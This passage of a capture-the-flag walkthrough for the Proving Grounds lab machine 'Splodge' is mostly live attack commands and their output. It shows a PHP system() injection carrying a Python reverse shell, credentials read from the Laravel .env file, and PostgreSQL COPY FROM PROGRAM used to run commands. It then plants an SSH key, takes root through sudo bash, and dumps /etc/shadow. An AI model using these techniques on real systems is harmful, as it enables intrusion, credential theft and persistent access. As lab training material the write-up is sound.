        <pre style="background-color: #f8f9fa; padding: 1rem;"><code><?php foreach ($cmdoutput as $x) { echo htmlspecialchars($x); echo "\r\n"; } ?></code></pre>
      </div>
    </div>
  </div>
  </body>
</html>
```

## Reverse Shell Test and fail

![](Pasted%20image%2020220302003825.png)

```bash
┌──(kali㉿kali)-[/tmp/80_git/tmp/repo/config]
└─$ nc -nlvp 8080        
listening on [any] 8080 ...
connect to [192.168.49.88] from (UNKNOWN) [192.168.88.108] 36518
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/80_git/tmp/repo/config]
└─$ 
```


## Reverse Shell Tests

Profanity Replacement: `system('ls /usr/bin | grep python');`

```
python
python2
python2.7
```


Profanity Replacement: `system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.88",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'');`

```bash
┌──(kali㉿kali)-[/tmp/80_git/tmp/repo/config]
└─$ nc -nlvp 8080
listening on [any] 8080 ...
connect to [192.168.49.88] from (UNKNOWN) [192.168.88.108] 36532
bash-4.2$ pwd
pwd
/usr/share/nginx/html/public
bash-4.2$ ls
ls
css  favicon.ico  index.php  robots.txt
bash-4.2$ cd home
cd home
bash: cd: home: No such file or directory
bash-4.2$ cd /home
cd /home
bash-4.2$ ls
ls
thesplodge
bash-4.2$ cd thesplodge
cd thesplodge
bash-4.2$ ls
ls
local.txt
bash-4.2$ cat local.txt
cat local.txt
7ae2ed82a1a5ade8ef54ff0dcd927f4e
bash-4.2$ ifconfig
ifconfig
bash: ifconfig: command not found
bash-4.2$ cat local.txt
cat local.txt
7ae2ed82a1a5ade8ef54ff0dcd927f4e
bash-4.2$ /sbin/ifconfig
/sbin/ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.88.108  netmask 255.255.255.0  broadcast 192.168.88.255
        ether 00:50:56:ba:3a:0e  txqueuelen 1000  (Ethernet)
        RX packets 18831  bytes 3226317 (3.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16877  bytes 16601352 (15.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1958  bytes 467797 (456.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1958  bytes 467797 (456.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bash-4.2$
```

![](Pasted%20image%2020220302004527.png)

# Privesc

## Enumerate web server files

```bash
bash-4.2$ pwd
pwd
/usr/share/nginx/html/public
bash-4.2$ ls
ls
css  favicon.ico  index.php  robots.txt
bash-4.2$ cd ..
cd ..
bash-4.2$ ls
ls
app        composer.json  database     resources   storage
artisan    composer.lock  phpunit.xml  routes      vendor
bootstrap  config         public       server.php
bash-4.2$ cd database
cd database
bash-4.2$ ls
ls
factories  migrations  seeds  splodge.db
bash-4.2$ 
```

```bash
bash-4.2$ cat nginx.conf
cat nginx.conf
user nginx;
worker_processes auto;
error_log /var/log/nginx/error.log;
pid /run/nginx.pid;

include /usr/share/nginx/modules/*.conf;

events {
    worker_connections 1024;
}

http {
    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';
    access_log  /var/log/nginx/access.log  main;
    sendfile            on;
    tcp_nopush          on;
    tcp_nodelay         on;
    keepalive_timeout   65;
    types_hash_max_size 2048;
    include             /etc/nginx/mime.types;
    default_type        application/octet-stream;

    include /etc/nginx/conf.d/*.conf;

    server {
        listen       80 default_server;
        listen       [::]:80 default_server;
        server_name  _;
        root         /usr/share/nginx/html;

        include /etc/nginx/default.d/*.conf;

        location / {}

        error_page 404 /404.html;
        location = /404.html {}

        error_page 500 502 503 504 /50x.html;
        location = /50x.html {}

        location ~ \.php$ {
            return 403;
        }

        location ~ \.env$ {
            return 403;
        }
    }
}
bash-4.2$ cd conf.d
cd conf.d
bash-4.2$ ls
ls
commando.conf  default.conf
bash-4.2$ cat default.conf
cat default.conf
server {
    listen       8080;
    server_name  splodge.offsec;
    root         /usr/share/nginx/html/public;
    index        index.php;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location = /favicon.ico { access_log off; log_not_found off; }
    location = /robots.txt  { access_log off; log_not_found off; }

    error_page 404 /index.php;

    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php-fpm/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
bash-4.2$ cat commando.conf 
cat commando.conf
server {
    listen       1337;
    server_name  commando.offsec;
    root         /usr/share/nginx/commando;
    index        index.php;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location = /favicon.ico { access_log off; log_not_found off; }
    location = /robots.txt  { access_log off; log_not_found off; }

    error_page 404 /index.php;

    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php-fpm/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
bash-4.2$ pwd
pwd                                                                                                                                                                     
/etc/nginx/conf.d                                                                                                                                                       
bash-4.2$ 
```

```bash
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Splodge]
└─$ wget http://192.168.88.108/database/splodge.db
--2022-03-01 11:57:06--  http://192.168.88.108/database/splodge.db
Connecting to 192.168.88.108:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8192 (8.0K) [application/octet-stream]
Saving to: ‘splodge.db’

splodge.db                                100%[=====================================================================================>]   8.00K  --.-KB/s    in 0s      

2022-03-01 11:57:07 (343 MB/s) - ‘splodge.db’ saved [8192/8192]

                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Splodge]
└─$ 
```

![](Pasted%20image%2020220302005848.png)

## Enumerate Database

Got the idea of using environment variables from the file

```bash
bash-4.2$ pwd
pwd
/usr/share/nginx/html/config
bash-4.2$ cat database.php
cat database.php
<?php

return [

    /*
    |--------------------------------------------------------------------------
    | Default Database Connection Name
    |--------------------------------------------------------------------------
    |
    | Here you may specify which of the database connections below you wish
    | to use as your default connection for all database work. Of course
    | you may use many connections at once using the Database library.
    |
    */

    'default' => env('DB_CONNECTION', 'mysql'),

    /*
    |--------------------------------------------------------------------------
    | Database Connections
    |--------------------------------------------------------------------------
    |
    | Here are each of the database connections setup for your application.
    | Of course, examples of configuring each database platform that is
    | supported by Laravel is shown below to make development simple.
    |
    |
    | All database work in Laravel is done through the PHP PDO facilities
    | so make sure you have the driver for your particular database of
    | choice installed on your machine before you begin development.
    |
    */

    'connections' => [

        'sqlite' => [
            'driver' => 'sqlite',
            'database' => env('DB_DATABASE', database_path('database.sqlite')),
            'prefix' => '',
        ],

        'mysql' => [
            'driver' => 'mysql',
            'host' => env('DB_HOST', '127.0.0.1'),
            'port' => env('DB_PORT', '3306'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'unix_socket' => env('DB_SOCKET', ''),
            'charset' => 'utf8mb4',
            'collation' => 'utf8mb4_unicode_ci',
            'prefix' => '',
            'strict' => true,
            'engine' => null,
        ],

        'pgsql' => [
            'driver' => 'pgsql',
            'host' => env('DB_HOST', '127.0.0.1'),
            'port' => env('DB_PORT', '5432'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'charset' => 'utf8',
            'prefix' => '',
            'schema' => 'public',
            'sslmode' => 'prefer',
        ],

        'sqlsrv' => [
            'driver' => 'sqlsrv',
            'host' => env('DB_HOST', 'localhost'),
            'port' => env('DB_PORT', '1433'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'charset' => 'utf8',
            'prefix' => '',
        ],

    ],

    /*
    |--------------------------------------------------------------------------
    | Migration Repository Table
    |--------------------------------------------------------------------------
    |
    | This table keeps track of all the migrations that have already run for
    | your application. Using this information, we can determine which of
    | the migrations on disk haven't actually been run in the database.
    |
    */

    'migrations' => 'migrations',

    /*
    |--------------------------------------------------------------------------
    | Redis Databases
    |--------------------------------------------------------------------------
    |
    | Redis is an open source, fast, and advanced key-value store that also
    | provides a richer set of commands than a typical key-value systems
    | such as APC or Memcached. Laravel makes it easy to dig right in.
    |
    */

    'redis' => [

        'client' => 'predis',

        'default' => [
            'host' => env('REDIS_HOST', '127.0.0.1'),
            'password' => env('REDIS_PASSWORD', null),
            'port' => env('REDIS_PORT', 6379),
            'database' => 0,
        ],

    ],

];
bash-4.2$ 
bash-4.2$ cat filesystems.php
cat filesystems.php
<?php

return [

    /*
    |--------------------------------------------------------------------------
    | Default Filesystem Disk
    |--------------------------------------------------------------------------
    |
    | Here you may specify the default filesystem disk that should be used
    | by the framework. The "local" disk, as well as a variety of cloud
    | based disks are available to your application. Just store away!
    |
    */

    'default' => env('FILESYSTEM_DRIVER', 'local'),

    /*
    |--------------------------------------------------------------------------
    | Default Cloud Filesystem Disk
    |--------------------------------------------------------------------------
    |
    | Many applications store files both locally and in the cloud. For this
    | reason, you may specify a default "cloud" driver here. This driver
    | will be bound as the Cloud disk implementation in the container.
    |
    */

    'cloud' => env('FILESYSTEM_CLOUD', 's3'),

    /*
    |--------------------------------------------------------------------------
    | Filesystem Disks
    |--------------------------------------------------------------------------
    |
    | Here you may configure as many filesystem "disks" as you wish, and you
    | may even configure multiple disks of the same driver. Defaults have
    | been setup for each driver as an example of the required options.
    |
    | Supported Drivers: "local", "ftp", "s3", "rackspace"
    |
    */

    'disks' => [

        'local' => [
            'driver' => 'local',
            'root' => storage_path('app'),
        ],

        'public' => [
            'driver' => 'local',
            'root' => storage_path('app/public'),
            'url' => env('APP_URL').'/storage',
            'visibility' => 'public',
        ],

        's3' => [
            'driver' => 's3',
            'key' => env('AWS_KEY'),
            'secret' => env('AWS_SECRET'),
            'region' => env('AWS_REGION'),
            'bucket' => env('AWS_BUCKET'),
        ],

    ],

];
bash-4.2$ 
bash-4.2$ env
env
DB_HOST=127.0.0.1
DB_PORT=5432
SESSION_DRIVER=file
OLDPWD=/usr/share/nginx/html
APP_NAME=Splodge
USER=nginx
BROADCAST_DRIVER=log
CACHE_DRIVER=file
APP_URL=http://splodge.offsec
DB_CONNECTION=pgsql
DB_DATABASE=splodge
PWD=/usr/share/nginx/html/config
DB_PASSWORD=PolicyWielderCandle120
APP_DEBUG=false
APP_KEY=base64:F9jFCNy0vJ1GhEsbf+PjmTSSHk8u741C5XNTN1Rguow=
SHLVL=3
DB_USERNAME=postgres
HOME=/var/lib/nginx
APP_LOG_LEVEL=info
APP_ENV=local
QUEUE_DRIVER=sync
_=/usr/bin/env
bash-4.2$
```

```bash
bash-4.2$ cd ..
cd ..
bash-4.2$ cat .env
cat .env
APP_NAME=Splodge
APP_ENV=local
APP_KEY=base64:F9jFCNy0vJ1GhEsbf+PjmTSSHk8u741C5XNTN1Rguow=
APP_DEBUG=false
APP_LOG_LEVEL=info
APP_URL=http://splodge.offsec

DB_CONNECTION=pgsql
DB_HOST=127.0.0.1
DB_PORT=5432
DB_DATABASE=splodge
DB_USERNAME=postgres
DB_PASSWORD=PolicyWielderCandle120

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
QUEUE_DRIVER=sync
bash-4.2$ 

```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ psql -h 192.168.88.108 -U postgres -W # PolicyWielderCandle120
Password: 
psql (13.2 (Debian 13.2-1), server 12.4)
Type "help" for help.

postgres=# \du
                                   List of roles
 Role name |                         Attributes                         | Member of 
-----------+------------------------------------------------------------+-----------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}

postgres=# \list
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 splodge   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(4 rows)

postgres=# \c splodge
Password: 
psql (13.2 (Debian 13.2-1), server 12.4)
You are now connected to database "splodge" as user "postgres".
splodge=# \d
                List of relations
 Schema |       Name        |   Type   |  Owner   
--------+-------------------+----------+----------
 public | comments          | table    | postgres
 public | comments_id_seq   | sequence | postgres
 public | migrations        | table    | postgres
 public | migrations_id_seq | sequence | postgres
 public | posts             | table    | postgres
 public | posts_id_seq      | sequence | postgres
 public | settings          | table    | postgres
 public | settings_id_seq   | sequence | postgres
(8 rows)

splodge=# select * from comments;
 id | post_id | author |          message          | created_at | updated_at 
----+---------+--------+---------------------------+------------+------------
  1 |       2 | hello  | test <h1>Text</h1>        |            | 
  2 |       2 | hello  | <?php system('whoami');?> |            | 
  3 |       2 | hello  | 1                         |            | 
  4 |       2 | hello  | nginx                     |            | 
  5 |       2 | hello  | Resource id #250          |            | 
  6 |       2 | hello  | </html>                   |            | 
  7 |       2 | hello  | python2.7                 |            | 
(7 rows)

splodge=# CREATE TABLE demo(t text);
CREATE TABLE
splodge=# COPY demo from '/etc/shadow';
ERROR:  could not open file "/etc/shadow" for reading: Permission denied
HINT:  COPY FROM instructs the PostgreSQL server process to read a file. You may want a client-side facility such as psql's \copy.
splodge=# DROP TABLE demo;
DROP TABLE
splodge=# /d
splodge-# \d
                List of relations
 Schema |       Name        |   Type   |  Owner   
--------+-------------------+----------+----------
 public | comments          | table    | postgres
 public | comments_id_seq   | sequence | postgres
 public | migrations        | table    | postgres
 public | migrations_id_seq | sequence | postgres
 public | posts             | table    | postgres
 public | posts_id_seq      | sequence | postgres
 public | settings          | table    | postgres
 public | settings_id_seq   | sequence | postgres
(8 rows)

splodge-# 
```

## enumerate & Inject SSH Key to thesplodge

```bash
splodge=# CREATE TABLE demo(t text);
CREATE TABLE
splodge=# COPY demo from PROGRAM 'whoami';
COPY 1
splodge=# SELECT * from DEMO;
     t      
------------
 thesplodge
(1 row)

splodge=# DROP TABLE demo;
DROP TABLE
splodge=# 
```

Injecting the key
```bash
splodge=# DROP TABLE demo;
DROP TABLE
splodge=# CREATE TABLE demo(t text);
CREATE TABLE
splodge=# COPY demo from PROGRAM 'mkdir /home/thesplodge/.ssh/';
COPY 0
splodge=# COPY (SELECT "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali") to '/home/thesplodge/.ssh/authorized_keys';
NOTICE:  identifier "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali" will be truncated to "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7"
ERROR:  column "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7" does not exist
LINE 1: COPY (SELECT "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc...
                     ^
splodge=# COPY (SELECT 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali') to '/home/thesplodge/.ssh/authorized_keys';
COPY 1
splodge=# DROP TABLE demo;
DROP TABLE
splodge=# 
```

At first connection failure
```bash
┌──(root💀kali)-[/home/kali]
└─# ssh thesplodge@192.168.88.108                                                    
The authenticity of host '192.168.88.108 (192.168.88.108)' can't be established.
ECDSA key fingerprint is SHA256:u/3yg5nDTWz2exBsMp9IXzQSKFLJff0CbnMnuS5uMco.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.88.108' (ECDSA) to the list of known hosts.
thesplodge@192.168.88.108's password: 
```

but now with the key

```bash
┌──(kali㉿kali)-[/tmp]
└─$ cat ~/.ssh/id_rsa.pub                              
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i ~/.ssh/id_rsa thesplodge@192.168.88.108
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh thesplodge@192.168.88.108                                                                                                                                 130 ⨯
[thesplodge@splodge ~]$ ls
local.txt
[thesplodge@splodge ~]$ exit
logout
Connection to 192.168.88.108 closed.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i ~/.ssh/id_rsa thesplodge@192.168.88.108
[thesplodge@splodge ~]$ 
```

## Sudo 

```bash
[thesplodge@splodge tmp]$ sudo -l
Matching Defaults entries for thesplodge on splodge:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User thesplodge may run the following commands on splodge:
    (ALL) NOPASSWD: /bin/bash
[thesplodge@splodge tmp]$ sudo /bin/bash
[root@splodge tmp]# cd /root
[root@splodge ~]# ls
proof.txt
[root@splodge ~]# cat proof.txt
51aa08234e6e240649f615edeb5df9bc
[root@splodge ~]# ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.88.108  netmask 255.255.255.0  broadcast 192.168.88.255
        ether 00:50:56:ba:3a:0e  txqueuelen 1000  (Ethernet)
        RX packets 23668  bytes 3759076 (3.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18366  bytes 17155187 (16.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3130  bytes 865940 (845.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3130  bytes 865940 (845.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[root@splodge ~]# 
```

![](Pasted%20image%2020220302020700.png)

# Others

```bash
[root@splodge ~]# cat /etc/shadow
root:$6$cl4lIiMO7BWKK2O/$HpeR976Wh2tGG6gOSTDTnOD.9b368HOGcAEWHYRetOWysXDTeqMtR9LRBY6OY9bw.kPYq3D4fGeN7CVUqegW0.:18553:0:99999:7:::
bin:*:17834:0:99999:7:::
daemon:*:17834:0:99999:7:::
adm:*:17834:0:99999:7:::
lp:*:17834:0:99999:7:::
sync:*:17834:0:99999:7:::
shutdown:*:17834:0:99999:7:::
halt:*:17834:0:99999:7:::
mail:*:17834:0:99999:7:::
operator:*:17834:0:99999:7:::
games:*:17834:0:99999:7:::
ftp:*:17834:0:99999:7:::
nobody:*:17834:0:99999:7:::
systemd-network:!!:18547::::::
dbus:!!:18547::::::
polkitd:!!:18547::::::
sshd:!!:18547::::::
postfix:!!:18547::::::
chrony:!!:18547::::::
thesplodge:$6$CeYhw/Xrp0z/Rpi$gVRFbRKh40kKKxQOvy6HTA83/PmoSAGfZoyT0SUwSl54imxbxNGd965DK257EIf.zyj0YG6pNzLMAYEXyipBr.:18553:0:99999:7:::
postgres:!!:18553::::::
nginx:!!:18553::::::
apache:!!:18553::::::
[root@splodge ~]# 
```